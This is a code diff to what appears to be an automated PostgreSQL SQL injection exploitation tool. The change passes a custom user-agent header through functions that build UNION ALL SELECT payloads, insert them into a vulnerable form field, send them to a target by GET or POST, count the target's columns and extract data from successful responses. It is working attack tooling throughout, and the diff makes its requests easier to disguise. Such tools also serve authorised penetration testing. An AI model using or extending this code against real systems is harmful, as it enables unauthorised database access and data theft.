@@ -5,7 +5,7 @@ from utils import write_to_file, vulnerable, check_response
 from extract_data import extract_psql_data
 
 
-def test_postgresql_columns(url, http_method, data, vulnerable_field, file):
+def test_postgresql_columns(url, http_method, data, vulnerable_field, file, user_agent):
     """
     Function to test for PostgreSQL injection by checking the number of columns
     """
@@ -16,9 +16,11 @@ def test_postgresql_columns(url, http_method, data, vulnerable_field, file):
         payload += "--"
         data[vulnerable_field] = payload
         if http_method.lower() == "get":
-            response = requests.get(url, params=data)
+            response = requests.get(
+                url, params=data, headers=user_agent)
         elif http_method.lower() == "post":
-            response = requests.post(url, data=data)
+            response = requests.post(
+                url, data=data, headers=user_agent)
         else:
             print(f"{Fore.RED}[-] Invalid HTTP method{Style.RESET_ALL}")
             return
@@ -37,22 +39,25 @@ def generate_payload_psql(base_payload, columns):
     return "1' UNION ALL SELECT " + ",".join(payload_parts) + "--"
 
 
-def send_payload_psql(url, http_method, data, vulnerable_field, payload):
+def send_payload_psql(url, http_method, data, vulnerable_field, payload, user_agent):
     """
     Function to send payload for PostgreSQL injection
     """
+    print(f"{Fore.LIGHTCYAN_EX}[*] Sending user-agent: {user_agent}")
     data[vulnerable_field] = payload
     if http_method.lower() == "get":
-        response = requests.get(url, params=data)
+        response = requests.get(
+            url, params=data, headers=user_agent)
     elif http_method.lower() == "post":
-        response = requests.post(url, data=data)
+        response = requests.post(
+            url, data=data, headers=user_agent)
     else:
         print(f"{Fore.RED}[-] Invalid HTTP method{Style.RESET_ALL}")
         sys.exit
     return response
 
 
-def exploit_union_based_postgresql(url, http_method, data, vulnerable_field, columns, file):
+def exploit_union_based_postgresql(url, http_method, data, vulnerable_field, columns, file, user_agent):
     """
     Function to exploit PostgreSQL injection using UNION based method
     """
@@ -70,7 +75,10 @@ def exploit_union_based_postgresql(url, http_method, data, vulnerable_field, col
     ]
     for base_payload in payloads:
         payload = generate_payload_psql(base_payload, columns)
-        response = send_payload_psql(url, http_method, data, vulnerable_field, payload)
+        response = send_payload_psql(
+            url, http_method, data,
+            vulnerable_field, payload,
+            user_agent)
         if check_response(response):
             print(f"{Fore.LIGHTGREEN_EX}[+] Payload success: {payload}{Style.RESET_ALL}")
             extract_psql_data(response, file, payload, vulnerable_field)
@@ -78,7 +86,7 @@ def exploit_union_based_postgresql(url, http_method, data, vulnerable_field, col
             print(f"{Fore.RED}[-] Failed to send payload: {payload}{Style.RESET_ALL}")
 
 
-def test_postgresql(url, http_method, data, vulnerable_field, file):
+def test_postgresql(url, http_method, data, vulnerable_field, file, user_agent):
     """
     Wrapper function to test PostgreSQL injection
     """
@@ -87,7 +95,13 @@ def test_postgresql(url, http_method, data, vulnerable_field, file):
         file,
         f"[*] Testing for PostgreSQL injection: {url} with {http_method} method"
     )
-    columns = test_postgresql_columns(url, http_method, data, vulnerable_field, file)
+    columns = test_postgresql_columns(
+        url, http_method,
+        data, vulnerable_field,
+        file, user_agent)
     if columns is None:
         return
-    exploit_union_based_postgresql(url, http_method, data, vulnerable_field, columns, file)
+    exploit_union_based_postgresql(
+        url, http_method,
+        data, vulnerable_field,
+        columns, file, user_agent)
